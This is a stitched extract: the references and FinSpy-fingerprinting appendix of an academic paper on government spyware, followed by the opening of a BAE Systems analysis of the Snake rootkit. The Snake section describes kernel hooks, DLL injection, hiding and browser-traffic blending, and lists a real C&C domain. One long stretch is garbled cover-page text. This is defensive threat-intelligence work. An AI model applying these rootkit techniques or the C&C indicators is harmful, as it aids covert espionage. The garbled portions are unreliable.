                                                                                   USENIX Association
 [8] D. Gilbert, 
Hacking Team and the Murky World of                 [27] 
FinFisher - Excellence in IT Investigation,
 ac-
     State-Sponsored Spying,
 2013, accessed: 12-November-                 cessed:      27-February-2014. [Online]. Available:
     2013. [Online]. Available: http://bit.ly/17tBBtm                      http://www.finfisher.com/
 [9] R. Clayton, S. J. Murdoch, and R. N. Watson, 
Ignoring           [28] R. Rolles, 
Unpacking virtualization obfuscators,
     the Great Firewall of China,
 in PETS. Springer, 2006,                USENIX WOOT, 2009.
     pp. 20
35.                                                       [29] 
TEMU: The BitBlaze Dynamic Analysis Compo-
[10] J. R. Crandall et al., 
ConceptDoppler: A Weather                     nent,
 accessed: 7-August-2013. [Online]. Available:
     Tracker for Internet Censorship,
 in ACM CCS, 2007.                   http://bit.ly/1clcxSZ
[11] X. Xu, Z. M. Mao, and J. A. Halderman, 
Internet Cen-            [30] 
Reinstate sacked official
       call,
   2013,   ac-
     sorship in China: Where Does the Filtering Occur?
 in                 cessed:       11-November-2013.    [Online]. Available:
     Proc. PAM, 2011.                                                      http://bit.ly/1aRUZ4b
[12] M. Sherr, G. Shah, E. Cronin, S. Clark, and M. Blaze,            [31] 
Unionist Questioned,
 2013, accessed: 23-April-2013.
     
Can They Hear Me Now? A Security Analysis of Law                     [Online]. Available: http://bit.ly/1gHnBiS
     Enforcement Wiretaps,
 in ACM CCS, 2009, pp. 512
                [32] N. Villeneuve, 
Fake Skype Encryption Service Cloaks
     523.                                                                  DarkComet Trojan,
 Apr. 2012, accessed: 4-August-
[13] J. R. Crandall, M. Crete-Nishihata, and J. Knockel, 
Chat             2013. [Online]. Available: http://bit.ly/17SpA1c
     program censorship and surveillance in China: Tracking           [33] E. Galperin and M. Marquis-Boire, 
Fake YouTube
     TOM-Skype and Sina UC,
 First Monday, vol. 18, no. 7,                 Site Targets Syrian Activists With Malware,
 Mar.
     Jul. 2013, accessed: 8-August-2013. [Online]. Available:              2012, accessed: 4-August-2013. [Online]. Available:
     http://bit.ly/1fzNcHl                                                 http://bit.ly/HSCRet
[14] S. Wolchok, R. Yao, and J. A. Halderman, 
Analysis of            [34] 
New Wave of Facebook Phishing Attacks Targets
     the Green Dam Censorware System,
 Tech. Rep., 2009.                   Syrian Activists,
 Apr. 2012, accessed: 4-August-2013.
[15] F. Li, A. Lai, and D. Ddl, 
Evidence of Advanced Persis-              [Online]. Available: http://bit.ly/1hDQsG8
     tent Threat: A case study of malware for political espi-         [35] 
Pro-Syrian Government Hackers Target Activists
     onage,
 in MALWARE, 2011.                                             With Fake Anti-Hacking Tool,
 Aug. 2012, accessed:
[16] 
Default https access for Gmail,
 2010, accessed: 7-                  4-August-2013. [Online]. Available: http://bit.ly/1eJj12T
     August-2013. [Online]. Available: http://bit.ly/1bBktPM          [36] J. Scott-Railton and M. Marquis-Boire, 
A Call to Harm:
[17] 
Making Twitter more secure: HTTPS,
 2011, accessed:                  New Malware Attacks Target the Syrian Opposition,
     7-August-2013. [Online]. Available: http://bit.ly/1i7l9kM             Citizen Lab, Tech. Rep., Jun. 2013, accessed: 3-August-
                                                                           2013. [Online]. Available: http://bit.ly/1a2l9PK
[18] L. Constantin, 
Facebook to roll out HTTPS by default
     to all users,
 2012, accessed: 7-August-2013. [Online].          [37] E. Galperin and M. Marquis-Boire, 
Trojan Hidden
     Available: http://bit.ly/1bsLBCm                                      in Fake Revolutionary Documents Targets Syrian Ac-
                                                                           tivists,
 May 2012, accessed: 4-August-2013. [Online].
[19] 
FinFisher: Governmental IT Intrusion and Remote
                                                                           Available: http://bit.ly/1cSJT0
     Monitoring Solutions,
 accessed: 12-November-2013.
     [Online]. Available: http://bit.ly/1840Lxn                       [38] M. Marquis-Boire and S. Hardy, 
Syrian Activists Tar-
                                                                           geted with BlackShades Spy Software,
 Jun. 2012,
[20] 
BlackBerry rogue software leaves sour taste in UAE,
                                                                           accessed:      12-November-2013. [Online]. Available:
     2013, accessed: 11-November-2013. [Online]. Available:
                                                                           http://bit.ly/1a2l6mX
     http://on.ft.com/HVXvJP
                                                                      [39] S. Fagerland, 
The Syrian Spyware,
 Feb. 2012,
[21] Mandiant, 
The Advanced Persistent Threat,
 2010.
                                                                           accessed:       4-August-2013. [Online]. Available:
[22] 
APT1: Exposing One of China
s Cyber Espionage                    http://bit.ly/HLyGR9
     Units,
 2013.
                                                                      [40] Telecomix, 
REPORT of a Syrian spyware,
 p. 9, Feb.
[23] S. Fagerland, M. Krakvik, J. Camp, and N. Moran, 
Op-                 2012, accessed: 4-August-2013. [Online]. Available:
     eration Hangover: Unveiling an Indian Cyberattack In-                 http://bit.ly/1bsNcIk
     frastructure,
 2013.
                                                                      [41] S. Faris, 
The Hackers of Damascus,
 Nov.
[24] R. Deibert and R. Rohozinski, 
Tracking GhostNet: In-                 2012, accessed: 9-August-2013. [Online]. Available:
     vestigating a Cyber Espionage Network,
 Information                   http://buswk.co/17t8RRH
     Warfare Monitor, p. 6, 2009.                                     [42] L. Aylward, 
Malware Analysis
Dark Comet RAT,
[25] S. Nagaraja and R. Anderson, 
The snooping dragon:                    Nov. 2011, accessed: 4-August-2013. [Online]. Avail-
     social-malware surveillance of the Tibetan movement,
                 able: http://bit.ly/16ZXgag
     Tech. Rep., 2009.                                                [43] Quequero, 
DarkComet Analysis
Understanding the
[26] F. C. Solutions, 
njRAT
 Uncovered,
 2013, accessed:                 Trojan used in Syrian Uprising,
 Mar. 2012, accessed:
     25-June-2013. [Online]. Available: http://bit.ly/1eJheel              4-August-2013. [Online]. Available: http://bit.ly/19i6kEl
                                                                 13
USENIX Association 
                                                                      23rd USENIX Security Symposium
 523
[44] S. Denbow and J. Hertz, 
Pest Control: Taming the               [63] 
Ultimate       Packer        for    eXecutables,
     ac-
     RATs,
 p. 14, accessed: 12-November-2013. [Online].                  cessed:        27-February-2014. [Online]. Available:
     Available: http://bit.ly/1fzLA0m                                     http://upx.sourceforge.net/
[45] B. Brumfield, 
Computer spyware is newest weapon in             [64] 
CVE-2013-0422,
 accessed: 27-February-2014. [On-
     Syrian conflict,
 Feb. 2012, accessed: 4-August-2013.                line]. Available: http://bit.ly/NA1O0A
     [Online]. Available: http://cnn.it/HLz5TA                       [65] njq8, 
New java drive-by 2013-1-11,
 2013, accessed:
[46] 
jalnosra.com,
 accessed: 27-February-2014. [Online].                27-February-2014. [Online]. Available: http://www.dev-
     Available: jalnosra.com                                              point.com/vb/t357796.html
[47] 
Skype Encryption.wmv,
 accessed: 27-February-2014.             [66] 
Appin Technology Lab,
 accessed: 27-February-2014.
     [Online]. Available: http://bit.ly/HZ3e1y                            [Online]. Available: http://www.appinonline.com/
[48] E. Galperin and M. Marquis-Boire, 
The Internet                 [67] C. Guarnieri, 
Analysis of the FinFisher Lawful
     is Back in Syria and So is Malware Targeting                         Interception Malware,
 2012, accessed: 7-August-2013.
     Syrian Activists,
 Dec. 2012, accessed: 4-August-2013.               [Online]. Available: http://bit.ly/1eJjVMV
     [Online]. Available: http://bit.ly/1bngqFc                      [68] H. Moore, 
Critical Research: Internet Security Survey,
[49] 
Free Syrian Army Sex Tape
Abdul Razzaq Tlass                        2012.
     [NSFW],
 accessed: 5-August-2013. [Online]. Available:          [69] 
Democracy Index 2012: Democracy at a Standstill,
     http://bit.ly/1gHqDDH                                                2012, accessed: 7-August-2013. [Online]. Available:
[50] A. Lund, 
Holy Warriors: A field guide to Syria
s jihadi             http://bit.ly/HSEDMD
     groups,
 Oct. 2012, accessed: 5-August-2013. [Online].          [70] 
YARA - The pattern matching swiss knife for malware
     Available: http://atfp.co/17t8yq5                                    researchers,
 accessed: 27-February-2014. [Online].
                                                                          Available: http://plusvic.github.io/yara/
[51] 
Ahmed Mansoor and Four Other Pro-Democracy
     Activists Pardoned and Freed,
           2013,   ac-            [71] 
Cross-platform Trojan controls Windows and Mac
     cessed:       10-November-2013. [Online]. Available:                 machines,
 2012, accessed: 7-August-2013. [Online].
     http://bit.ly/18pHpis                                                Available: http://bit.ly/1eJnJgZ
[52] 
Royal Group,
 accessed: 27-February-2014. [Online].            [72] S. Golovanov, 
Adobe Flash Player 0-day and Hack-
     Available: http://www.royalgroupuae.com/                             ingTeam
s Remote Control System,
 2013, accessed:
                                                                          7-August-2013. [Online]. Available: http://bit.ly/17n12ro
[53] T. Katsuki, 
Crisis for Windows Sneaks onto Virtual
     Machines,
 2012, accessed: 27-February-2014. [Online].          [73] 
Internet Census 2012,
 2013, accessed: 7-August-2013.
     Available: http://bit.ly/MzheRJ                                      [Online]. Available: http://bit.ly/1i7rRHs
                                                                     [74] Z. Durumeric, E. Wustrow, and J. A. Halderman, 
ZMap:
[54] 
Hacking Team,
 accessed: 27-February-2014. [Online].
                                                                          Fast Internet-Wide Scanning and its Security Applica-
     Available: http://www.hackingteam.it/
                                                                          tions,
 in USENIX Security, Aug. 2013.
[55] 
MPRESS,
 accessed: 27-February-2014. [Online].
                                                                     [75] 
Home of Crossbear and OONIBear,
                      ac-
     Available: http://www.matcode.com/mpress.htm
                                                                          cessed:        27-February-2014. [Online]. Available:
[56] 
Sign in using application-specific passwords,
                      https://pki.net.in.tum.de/
     accessed:     27-February-2014. [Online]. Available:
                                                                     [76] 
RIPE Database Query for FASTWEB-HT,
 ac-
     https://support.google.com/accounts/answer/185833?hl=en
                                                                          cessed:        27-February-2014. [Online]. Available:
[57] S. Fagerland, 
Systematic cyber attacks against Is-                  http://bit.ly/MzkigV
     raeli and Palestinian targets going on for a year,
             [77] 
How Government-Grade Spy Tech Used A Fake Scandal
     2012, accessed: 12-November-2013. [Online]. Available:               To Dupe Journalists,
 2012, accessed: 7-August-2013.
     http://bit.ly/1aSdw07
                                                                     [78] A. Ornaghi, 
em-http-server,
 accessed: 27-February-
[58] V. Silver, 
Spyware Leaves Trail to Beaten                           2014. [Online]. Available: https://github.com/alor/em-
     Activist Through Microsoft Flaw,
 2012, ac-                          http-server
     cessed:     14-November-2013. [Online]. Available:
                                                                     [79] SophosLabs, 
Anatomy of a targeted attack
     http://bloom.bg/1ja2geI
                                                                          SophosLabs explores an Adobe zero-day 
malware
[59] B. Hubbard, 
Emirates Balk at Activism in Region                     experiment
 2013, accessed 7-August-2013. [Online].
     Hit by Uprisings,
 2013, accessed: 14-November-2013.                 Available: http://bit.ly/HQ1oRc
     [Online]. Available: http://nyti.ms/I4n2Aw
                                                                     [80] K. Zetter, 
American Gets Targeted by Digital
[60] 
SPY NET,
 accessed: 27-February-2014. [Online].                     Spy Tool Sold to Foreign Governments,
 2013,
     Available: http://newspynetrat.blogspot.com/                         accessed:      14-November-2013. [Online]. Available:
[61] 
Asprotect SKE,
 accessed: 27-February-2014. [Online].               http://wrd.cm/1fHonth
     Available: http://www.aspack.com/asprotect32.html               [81] M. Marquis-Boire and B. Marczak, 
From Bahrain
[62] 
Unpacking VBInject/VBCrypt/RunPE,
 2010, ac-                        With Love: FinFisher
s Spy Kit Exposed?
              Jul.
     cessed:         7-August-2013. [Online]. Available:                  2012, accessed: 4-August-2013. [Online]. Available:
     http://bit.ly/1e28nS2                                                http://bit.ly/1bngpB2
                                                                14
 23rd USENIX Security Symposium
                                                                           USENIX Association
A     FinSpy fingerprints
Previous work by Guarnieri on scanning for FinSpy servers
found that in response to a request such as GET /, the
Bahraini FinSpy C&C server returns a response with the string
Hallo Steffi
 [67]. Guarnieri searched a database of
such responses compiled by the Critical.IO Internet scanning
project [68], locating 11 additional servers in 10 countries [67].
We refer to this fingerprint as 
1 . Concurrent with this ef-
fort, we devised our own fingerprint 
1 that tested three as-
pects of the handshake between a FinSpy infectee and a Fin-
Spy C&C server, which follows a custom TLV-based protocol
running on ports such as 22, 53, 80, and 443. We conducted
targeted scanning of several countries using 
1 , and also con-
firmed Guarnieri
s findings for those servers still reachable af-
ter he published his findings.
   We observed a trend: changes in HTTP response behavior
by FinFisher after publication of findings about the software.
In July 2012, for example, after a post about Bahraini FinSpy
samples [81], servers closed the TCP connection in response
to a GET / or HEAD / request (although servers continued
to behave consistently with 
1 . Other changes followed later
in 2012, including a new response to GET / requests that in-
cluded an imperfect copy of an Apache server
s HTTP response
(the Date header used UTC rather than GMT). We fingerprinted
this error as 
2 , and later in 2012 fingerprinted other distinctive
behavior in response to GET / requests as 
   Subsequent scans of /0 for 
2 and 
3 , and five service
probes of the Internet Census for 
1 through 
3 , located several
additional servers. In Feburary 2013 we identified and finger-
printed new HTTP response behavior with 
4 and modified 
to produce 
2 , which tests only two of the three aspects of the
FinSpy handshake (the third test of 
1 was broken when Fin-
Spy servers were updated to accept types of invalid data they
had previously rejected).
   As of 3/13/13, all servers that matched any 
 fingerprint
matched 
                                                                       15
USENIX Association 
                                                        23rd USENIX Security Symposium
 525
                                                                              1 1 1 1 1 0                                            1
                                                                11 010 110 00 00 00 01 10 011 011 110 010 010 10 1
                                                                               1 1 1 0                                                0
                                                                 01 010 101 10 00 10 01 01 101 100 101 101 110 01
                                                                                1   0    0     0                                        1
                                                                  11 010 010 10 01 01 01 01 100 101 011 100 001 01
                                                                                 1 1 1 1                                                 0
                                                                   11 0 0 0 0 00 01 10 00 01 00 11 01 01
                                                                                                 1      1     1    01 10 10 1
                                                                                                                                             SNAKE CAMPAIGN
                                                                                                                                                          & CYBER ESPIONAGE TOOLKIT
                                                                                           1
                                                                                              00 010 101 10 10 11 10 10
                                                                                                                          1 0 1
                                                                                                     01 10 101 10 01 10 0
                                                                                                          0    0 0 0 10 11
                                                                                                            10 11 10 0 10 1
                                                                                                               10 00 01 0 10
                                                                                                                 01 011 001 10 10
                                                                                                                                     0
                                                                                                                   01 01 01 1
                                                                                                          3E}> 
                                                                                                                      11 001 010 11
                                                                                                              ,0
                                                                                                                        1 1 0 1
                                                                                                              $
                                                                                                                     10 101 001 01
                                                                                                          lad
                                                                                                                        0 1 1 1
                                                                                                                     10 101 010 00
                                                                                                                      01 010 101 01
                                                                                                        9
                                                                                         7-59 8:19Z v
                                                                                                      6
                                                                                                                        1 0 0
                                                                                                    D
                                                                                                                     01 101 101 01
                                                                                                  A
                                                                                             FD9F
                                                                                                                        0 0 1 1
                                                                                                                     11 01 00 00
                                                                                                                  01 01 01 01 1
                                                                                          10:2
                                                                                                              01 01 11 01 10
                                                                                                           01 11 01 01 00 1
                                                                                                       01 10 10 01 01 10
                                                                                                    01 10 10 01 01 10 0
                                                                                       1
                                                                       A3B- 7-01-04
                                                                                     6
                                                                                                01 10 01 01 10 00 01
                                                                                   A
                                                                                             11 10 01 01 10 01 01 10
                                                                                 -
                                                                            459b
                                                                                          00 01 11 1 01 11 10 10
                                                                                                    1      0
                                                                                  11 101 101 00 11 01 00 10 100 010
                                                                            0
                                                                                                      1     1 1 1
                                                                                   10 010 010 10 10 10 10 10 001 10
                                                                       4 20
                                                                                                       1 0 0 1
                                                                                    11 01 01 0 1 0 0 01 10 0
                                                                                        1    1     1    00 01 01 1 0 1
                                                                                     10 10 10 01 10 01 01 10 010 0
                                                                     9
                                                    \{B9 g.c 520
                                                                                         0    0
                                                                   -
                                    shor t abyBu ed_DLL
                                                                                                          1     1     1     0
                                                                                      01 101 101 01 10 10 11 10 101 0
                                                             lt]
                                                               D 5
                                                                                                           0     0     1 0
                                                                                       10 010 101 01 10 10 11 00 101
                                                          3DFE
                                                        Resu
                                                        ffer
                                                                                                            1      0 0 1
                                                                                        01 011 101 00 10 01 10 00 010
                                                        fic
                                                        AF
                                                          fi
                                                        pt
                                                        AA
                                                                                                              1 0 1 1
                                                                                         01 01 01 0 1 1 0 01 0
                                                    _con
                                                                                             1     1      0    10 10 11 0 1
                                    edx pt_traf
                                    shor [ebp+dw
                                    eax, _DEADBE
                                    offs t Encry
                                                      _
                                                                                          11 10 101 01 10 01 01 10 10
                                    off pt_XOR
                                                                                              0
                                    eax, exit
                                    flag, exit
                                                                                                                0     0    1 0
                                                                                           01 010 101 01 01 01 10 10
                                                  s
               edob BaseNam : snake
                                    decr eax
                                                t
                                             esp
                                                                                                                 1     0 0 0
                                                                                            11 011 101 00 01 11 10 10
                                           je c
                                    ebp, 0
                                                                                                                  1 0 0 0
                                                                                             11 01 01 0 1 1 1 10
                                           y
                                           t
                                           t
                                           e
                                           e
                                           y
                                                                                                  1     1      0    10 01 00 0
                                    eax,
                                    edOb
                                         s
                                         r
                                                                                              01 10 01 01 01 10 01 0
                                 near p
                                       c                                                           0      1
                                  
                                    eb
                                    de                                                                                          0     1
                                                                                                                     0    1
                                                                                                01 010 101 01 01 11 10
                                                                                                                      1    0     0 0
                                                                                                 11 011 101 00 01 10 01
                                                                                                                       1     1 1
                                                                                                  01 101 101 00 01 10 10
                               :
                         g db
 push
 call
 test
                      ject
                      proc
                           sh
                             h
                             h
                      call
                                                                                                                        1 0 0
                                                                                                   11 10 01 1 1 1 0
 mov
 mov
 cmp
                      mov
                           p
                      jnz
                           s
                           s
                                                                                                        0      1     0   01 00 01
                         u
                         m
                      pu
                      pu
                                                                                                     01 010 101 01 01 01 0
                      \
                      fi
                      p
                      c
aBas de 0, <
                    n
                                                                                                                          1     0 1
                                                                                                      01 011 101 00 01 10
                  o
                  L
               _c
                L
                                                                                                                           1 0 0
                                                                                                       01 01 01 0 0 1
           t_D
                                                                                                            1      1    0   11 10
             m
       nake
                                                                                                         11 010 101 01 00 10
         n a
         p
                                                                                                                              1 0
       e                                                                                                  11 10 101 11 01 10
       o
       y
                                                                                                               0
     c
aIdS
     r
                                                                                                                               0    0
                                                                                                           01 011 100 01 01 0
   i
                                                                                                                                0    1
                                                                                                             01 101 101 01 10
                                                                                                                                 0 0
                                                                                                              11 10 01 0 1
                     2A
                     2D
                      E
         :000 9631
                     32
                     37
                     39
                     3B
             004 3E
                     B8
                      8
         :000 482C
                     A0
                     A0
                     A1
             003 A3
                     AA
                     AC
                      1
         :000 81B6
                                                                                                                  0     1     1   10
                49 2
                14 B
                38 B
                                                                                                               01 010 100 00 10
.tex :000496
                   6
                   6
.tex :000496
.te :000496
                   6
                   6
.tex :000496
... :000147
                   7
... :000381
                   1
                   1
.tex :000381
.tex :000381
                   1
                   1
.te :00049
.te :00049
                 9
.te :00038
                 8
.te :00038
                                                                                                                                   0
                                                                                                                01 011 101 01 10
              04
              01
              03
              0
                                                                                                                                    0
                                                                                                                 11 010 110 01 0
       t:00
       t:00
       t:00
       t:00
           0
           0
                                                                                                                                     1
                                                                                                                   01 10 00 0
         :
         :
                                                                                                                       0     1    1
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
       t
                                                                                                                                      0
     x                                                                                                              10 011 010 01
     x
     x
     x
     x
     x
.tex
     x
     x
.tex
     x
     x
     x
     x
     x
.tex
   e
   e
   e
   e
   e
   e
   e
   e
                                                                                                                                        0
                                                                                                                     10 011 011 01
                                                                                                                      10 011 001 01
EXECUTIVE
SUMMARY
       BAE Systems Applied Intelligence: Snake Rootkit Report 2014   2
OVERVIEW
One of the questions which comes up in the months after big security whitepaper disclosures is:
where are they now? In other words, what happened to the operators, tools, and infrastructure
which was revealed in the reports, blog-posts, and press interviews.
Did they continue on as before, did they re-build the disclosed infrastructure and tools, did they go
away and get jobs in another line of work?
In some cases, the disclosure had little, if any impact on the operation. For example, after the
McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group
behind this. However, when Mandiant released their APT1 report in 2013, there was a noticeable
reduction in activity from the group 
 and much of the tools and infrastructure has not been seen
since.
In the September 2010 issue of Foreign Affairs magazine1, former US Deputy Secretary of Defense
William J. Lynn discussed a cyber-attack which happened two years previously on the DoD
classified computer networks. Lynn described how a foreign intelligence agency planted malicious
code on the networks with the aim of transferring data to servers under their control.
The article included the now oft-quoted phrase 
digital beachhead
 to describe what was
undoubtedly a significant compromise of US military systems. Further reports in the press2 kept the
story alive in 2011, but since then this threat has received remarkably little attention.
However, the operation behind the attacks has continued with little modification to the tools and
techniques, in spite of the widespread attention a few years ago. They use highly sophisticated
malware tools to maintain persistent access to their targets. These tools can be used for covert
communications in a number of different modes, some of which present significant challenges for
traditional security technologies to detect.
There are some threats which come and go, whilst there are others which are permanent
features of the landscape. In this paper, we describe the tools and techniques of one of the most
sophisticated and persistent threats we track. We hope this will help victims identify intrusions and
understand their need to improve defences. Cyber security is a collaborative effort 
 the operation
described in this paper again raises the bar for the security community in their efforts to keep up
with the attackers in cyber-space
     http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain
     http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617
                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014   3
TECHNICAL
DESCRIPTION
       BAE Systems Applied Intelligence: Snake Rootkit Report 2014   4
BACKGROUND
When antivirus back-end classification platforms cannot identify a malware family for an analysed malicious sample, they assign
generic names, such as 
Trojan Horse
 or 
Agent
. The variant letters are also assigned automatically, by using hexavigesimal
(or Base26) notation. That is, the variant letters are auto-assigned starting from 
, followed with 
, and so on until 
. Next
comes 
 and so on, until 
. After that, the variant letters start from 
 and so on, until 
Back in 2008 an unknown malicious file was discovered and auto-classified as 
Agent.BTZ
, meaning it was registered as unknown
malicious sample #1,898 in an anti-virus classification system. It wasn
t given an actual name, only a generic one.
Meanwhile, internally the authors behind this malware were using their own naming systems - with specific titles for their file
components and projects such as 
snake
uroburos
sengoku
, and 
snark
 used to denote variants of their framework.
A recent report from German security company GData3 described a sample from the 
uroburos
 variant of this framework. Their
report revealed the complex nature of this malware family, and showed that the operation behind 
Agent.BTZ
 has continued. As
a result of this disclosure, we are also releasing our own technical analysis of the threat, including a timeline of known samples,
known Command-and-Control (C&C) servers, and other indicators to aid investigators in discovering attacks.
Reverse engineering of recent malware samples shows these to be much more advanced variants of Agent.BTZ, though still sharing
many similarities and encryption methods with the original. Further investigation allowed us to locate related samples compiled
between 2006 and 2014, and spanning across several distinctive generations. The first section of this report gives an overview of
the samples collected, where they were reported and the timelines derived from their analysis.
Snake
s architecture turned out to be quite interesting. We have identified two distinct variants, both highly flexible but with two
different techniques for establishing and maintaining a presence on the target system. In general, its operation relies on kernel
mode drivers, making it a rootkit. It is designed to covertly install a backdoor on a compromised system, hide the presence of its
components, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism. At the
same time, Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures.
In the first model, the network communications are carried out from the userland - i.e. the area of the computer system where
application software executes. In another model, the network communications are handled by a kernel mode driver - i.e. the area
where lower level system code such as device drivers run. The choice of what architecture should be used may depend on a specific
target
s environment, allowing the Snake operators to choose the most suitable architecture to be deployed.
In both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes.
In both architectures, there is both 32-bit and 64-bit code involved. In order to distinguish between these architectures, we will call
them the usermode-centric and the kernel-centric architectures respectively.
The remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target
system and communicate with the outside world. We have also provided a set of technical indicators in the Appendix to enable
organisations and the security research community to identify compromises.
       https://www.gdata.de/rdk/dl-en-rp-Uroburos
                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014               5
SNAKE SAMPLES
In total we have collected over 100 unique files related to this espionage toolkit. Many of these were submitted to online malware
analysis websites by victims and investigators over several years. In many cases the source country information of the submission
is available. These allow us to visualise the distribution of countries where this malware has been seen:
                                                                                      #Samples                    Submission Year
                                                                                      Source country 2010 2011 2012 2013 2014 Total
                                                                                      Ukraine             1   3     6    8   14                                   32
                                                                                      Lithuania                          9    2                                   11
                                                                                      Great Britain                      4                                         4
                                                                                      Belgium                            2                                         2
                                                                                      Georgia                                 2                                    2
                                                                                      United States           1     1                                              2
                                                                                      Romania                            1                                         1
                                                                                      Hungary                                 1                                    1
                                                                                      Italy                                   1                                    1
                                                                                      Total               1   4     7   24   20                                   56
Whilst this view is likely to only be the tip of the iceberg, it does give us an initial insight into the profile of targets for the Snake
operations.
Other useful visualisations of the operations come from the compile timestamps. Below is shown a table with a count of the
number of files in our sample set from recent years. Two samples compiled in late January 2014 show that this activity is ongoing.
                            #Samples by compile month
                            Year          01       02        03         04       05       06        07       08       09       10        11        12     Total
                            2006               1                                      3                                                                       4
                            2007                                             1                  1                                    1                        3
                            2008                                    2                 1         2        1                                     2              8
                            2009               1         1                                               1                           3         2         2 10
                            2010               1         1                   1                  1                                    1         2              7
                            2011                                    1                           4        1                           3         1         3 13
                            2012               2                    1                           1                                    1         2         7 14
                            2013               1        13          5        2        5         4        3        2        1         2         1             39
                            2014               2                                                                                                              2
                            Total              8        15          9        4        9        13        6        2        1        11        10        12 100
Plotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks.
The creators of the malware operate a working week, just like any other professional. The single sample in our set which was
compiled on a Saturday is an outlier, but doesn
t alter the conclusion. Similarly, plotting the hour of the day in which the samples
were compiled reveals another human pattern 
 the working day. This has been adjusted to UTC+4 to show a possible fit to the
operators
 local time.
          #Samples compiled per day of the week                                                                   #Samples compiled by hour of the day
                                                                                                                         (adjusted to UTC+4)
        Mon      Tue      Wed       Thu        Fri            Sat            Sun
                                                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014                      6
USERMODE-CENTRIC ARCHITECTURE
The usermode-centric architecture of Snake is known to have been used from 2011 till 2014, with the most recent sample compiled
on January 28, 2014.
With this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that
module for the communications.
One of the analysed samples exposed multiple debug messages and source control check-in logs. It is not clear why those
messages were allowed in the deployed driver - possibly an operational security lapse. However, they give some insight into the
internal structure of the source code.
For example, the analysed driver gave away the following source file names:
    
   d:\proj\cn\fa64\common\loadlib\common/loadlib_helpers.c
    
   d:\proj\cn\fa64\common\loadlib\win/loadlib.c
    
   d:\proj\cn\fa64\uroboros\rk_common\libhook\common/libunhook.c
    
   d:\proj\cn\fa64\uroboros\rk_common\libhook\ntsystem/libhook.c
    
   d:\proj\cn\fa64\uroboros\rk_common\libhook\common/hook_helpers.c
    
   d:\proj\cn\fa64\uroboros\rk_common\libhook\common/libhook.c
    
   d:\proj\cn\fa64\uroboros\rk_common\libhook\common/idthook.c
    
   .\rk_ntsystem.c
    
   ..\common\helpers\interface_s.c
    
   ..\k2\fa_registry.c
    
   ..\k2\syshook.c
The source control check-in log examples, showing the names of the developers to be 
vlad
 and 
gilg
    
 $Id: snake_config.c 5204 2007-01-04 10:28:19Z vlad $
    
 $Id: mime64.c 12892 2010-06-24 14:31:59Z vlad $
    
 $Id: event.c 14097 2010-11-01 14:46:27Z gilg $
    
 $Id: named_mutex.c 15594 2011-03-18 08:04:09Z gilg $
    
 $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $
    
 $Id: ntsystem.c 19662 2012-07-09 13:17:17Z gilg $
    
 $Id: rw_lock.c 14516 2010-11-29 12:27:33Z gilg $
    
 $Id: rk_bpf.c 14518 2010-11-29 12:28:30Z gilg $
    
 $Id: t_status.c 14478 2010-11-27 12:41:22Z gilg $
It also exposed the project name of this particular variant as 
sengoku
    d:\proj\cn\fa64\sengoku\_bin\sengoku\win32_debug\sengoku_Win32.pdb
Now it
s time to execute the driver and see what it does.
                                                               BAE Systems Applied Intelligence: Snake Rootkit Report 2014        7
ROOTKIT EXECUTION
When first executed, the driver creates device named \Device\vstor32 with a symbolic link \DosDevices\vstor32.
This device is used for userland/kernel communications.
Next, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with
XOR 0xAA applied on top of it, so the driver decrypts it first.
Depending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.
The purpose of this DLL is to be injected into the user-mode processes. Some variants of Snake carry the DLL modules that can be
installed as a service, to be run within taskhost.exe or services.exe processes.
Next, the driver sets up the hooks for the following kernel-mode APIs:
    
 ZwCreateThread
    
 ZwCreateUserProcess
    
 ZwShutdownSystem
After that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.
The handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect
any newly created processes, and restore its driver file in case it gets deleted.
Another set of hooks it sets is designed to hide the presence of the Snake components on the system:
    
 ZwQuerySystemInformation
    
 ZwQueryInformationProcess
    
 ZwClose
    
 ZwTerminateProcess
The driver then watches for all userland processes to see if they load any web pages.
As long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web
servers.
However, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module
into the process that initiated connection (the browser).
Once injected, the module initiates polling from one of the hard-coded C&C servers.
The purpose of this behaviour is to blend Snake
s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile
at the same time. By communicating from within a process that also communicates, even a technically savvy user will find it
challenging to detect Snake traffic among legitimate traffic.
The reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such
data as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc. When intercepted
with the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular
website, such as a news website is open.
Hiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.
In order to test Snake
s communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was
built to generate GET request to a web server running on the analysed system.
The tool was named as chrome.exe in order to trigger the malware communications.
                                                                BAE Systems Applied Intelligence: Snake Rootkit Report 2014               8
COMMAND-AND-CONTROL COMMUNICATIONS
As long as the test tool named chrome.exe did not make any requests, its memory stayed pristine. There were no injections made
by the driver.
As soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module
started producing the following traffic:
No.   Time           Source               Destination         Protocol Length Info
 38   44.290689000   192.168.202.131      192.168.202.2       DNS   77 Standard query 0x6ad3 A winter.site11.com
 41   44.292830000   192.168.202.2        192.168.202.131     DNS   93 Standard query response 0x6ad3 A 31.170.161.136
